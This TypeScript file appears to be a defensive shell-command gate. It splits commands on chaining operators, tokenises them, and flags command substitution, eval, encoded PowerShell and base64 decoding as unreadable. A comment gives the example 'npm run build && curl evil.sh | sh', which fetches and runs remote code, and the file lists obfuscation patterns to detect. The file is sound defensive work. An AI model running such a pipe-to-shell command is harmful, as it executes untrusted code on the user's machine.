// shell.ts — just enough shell awareness to refuse confidently.
//
// This is NOT a shell parser and must never be mistaken for one. Its only job
// is to answer "can I see the whole of what this command would do?" A rule that
// matches `npm run build` must not silently also match
// `npm run build && curl evil.sh | sh`, so the gate needs the segments, and it
// needs to know when a string contains something it cannot see through.
//
// Every ambiguity resolves toward "I cannot tell", which the classifier treats
// as a hard block. Being wrong in that direction costs a dialog; being wrong in
// the other direction costs the machine.

export interface ParsedCommand {
  /** Command segments, split on shell chaining outside quotes. */
  segments: string[];
  /** True when the string chains, pipes, or backgrounds more than one command. */
  chained: boolean;
  /**
   * Set when the text contains a construct whose effect cannot be read off the
   * surface: command substitution, eval, an encoded payload. Callers must treat
   * this as unparseable rather than trying harder.
   */
  opaque: string | null;
}

const CHAIN_OPS = ['&&', '||', ';', '|', '&', '\n', '\r'];

/**
 * Whether a backslash before this character is an escape.
 *
 * On Windows a backslash is a path separator far more often than an escape, so
 * treating every `\x` as an escape turns `..\..\other\x.js` into `......otherx.js`
 * -- which stops looking like a path, and a path that stops looking like a path
 * is never containment-checked. Only characters that would actually need
 * escaping count, which is correct for both cmd/PowerShell and bash.
 */
function isEscapable(ch: string | undefined): boolean {
  return ch !== undefined && (/\s/.test(ch) || `"'\\\`$&|;<>()`.includes(ch));
}

/**
 * Constructs that hide their real payload.
 *
 * Note `eval`/`iex` are matched as words, not substrings: `retrieval` contains
 * "eval" and is not a shell builtin.
 */
const OPAQUE_PATTERNS: Array<[RegExp, string]> = [
  [/\$\(/, 'command substitution `$(...)`'],
  [/`/, 'backtick command substitution'],
  [/<\(/, 'process substitution `<(...)`'],
  [/\$\{[^}]*[:#%/][^}]*\}/, 'parameter expansion with substitution'],
  [/\beval\b/i, '`eval`'],
  [/\b(?:iex|invoke-expression)\b/i, 'PowerShell `Invoke-Expression`'],
  // `\b` before a dash never matches: both the space and the dash are
  // non-word characters, so there is no boundary between them.
  [/(?:^|\s)-e(?:nc|ncodedcommand)\b/i, 'PowerShell `-EncodedCommand`'],
  [/\bfrombase64string\b/i, 'base64 decode'],
  [/\bbase64\s+(?:-{1,2}d\b|--decode\b)/i, 'base64 decode'],
  [/\bcertutil\b[^\n]*\b-decode\b/i, '`certutil -decode`'],
  [/\bstart-job\b/i, 'PowerShell background job'],
];

/** Split on chaining operators while respecting quotes. */
export function parseCommand(input: string): ParsedCommand {
  const text = String(input ?? '');

  for (const [re, label] of OPAQUE_PATTERNS) {
    if (re.test(text)) return { segments: [text], chained: true, opaque: label };
  }

  const segments: string[] = [];
  let current = '';
  let quote: '"' | "'" | null = null;
  let chained = false;

  for (let i = 0; i < text.length; i++) {
    const ch = text[i] as string;

    if (quote) {
      // Inside single quotes nothing escapes; inside double quotes a backslash does.
      if (quote === '"' && ch === '\\' && isEscapable(text[i + 1])) {
        current += ch + text[i + 1];
        i++;
        continue;
      }
      if (ch === quote) quote = null;
      current += ch;
      continue;
    }

    if (ch === '"' || ch === "'") {
      quote = ch;
      current += ch;
      continue;
    }

    // An escaped operator is not an operator.
    if (ch === '\\' && isEscapable(text[i + 1])) {
      current += ch + text[i + 1];
      i++;
      continue;
    }

    const two = text.slice(i, i + 2);
    const op = CHAIN_OPS.find((o) => (o.length === 2 ? two === o : ch === o));
    if (op) {
      // `2>&1` is a redirection, not a background operator.
      const isRedirectTarget = op === '&' && text[i - 1] === '>';
      if (!isRedirectTarget) {
        segments.push(current);
        current = '';
        chained = true;
        i += op.length - 1;
        continue;
      }
    }

    current += ch;
  }

  // An unterminated quote means the tokenisation above is fiction.
  if (quote) return { segments: [text], chained: true, opaque: 'unbalanced quote' };

  segments.push(current);

  const cleaned = segments.map((s) => s.trim()).filter((s) => s.length > 0);
  return {
    segments: cleaned.length ? cleaned : [''],
    chained: chained && cleaned.length > 1,
    opaque: null,
  };
}

export interface Token {
  value: string;
  /** True when the token was quoted in the source, so it is a literal, not a flag. */
  quoted: boolean;
}

/** Split one segment into tokens, stripping one level of quoting. */
export function tokenize(segment: string): Token[] {
  const tokens: Token[] = [];
  let current = '';
  let quoted = false;
  let started = false;
  let quote: '"' | "'" | null = null;

  const push = (): void => {
    if (started) tokens.push({ value: current, quoted });
    current = '';
    quoted = false;
    started = false;
  };

  for (let i = 0; i < segment.length; i++) {
    const ch = segment[i] as string;

    if (quote) {
      if (quote === '"' && ch === '\\' && isEscapable(segment[i + 1])) {
        current += segment[i + 1];
        i++;
        continue;
      }
      if (ch === quote) {
        quote = null;
        continue;
      }
      current += ch;
      continue;
    }

    if (ch === '"' || ch === "'") {
      quote = ch;
      quoted = true;
      started = true;
      continue;
    }

    if (ch === '\\' && isEscapable(segment[i + 1])) {
      current += segment[i + 1] as string;
      started = true;
      i++;
      continue;
    }

    if (ch === ' ' || ch === '\t') {
      push();
      continue;
    }

    current += ch;
    started = true;
  }
  push();

  return tokens;
}

/** The executable name, lowercased, with any path and `.exe` stripped. */
export function commandName(segment: string): string {
  const first = tokenize(segment)[0]?.value ?? '';
  const base = first.split(/[/\\]/).pop() ?? first;
  return base.replace(/\.(exe|cmd|bat|ps1)$/i, '').toLowerCase();
}
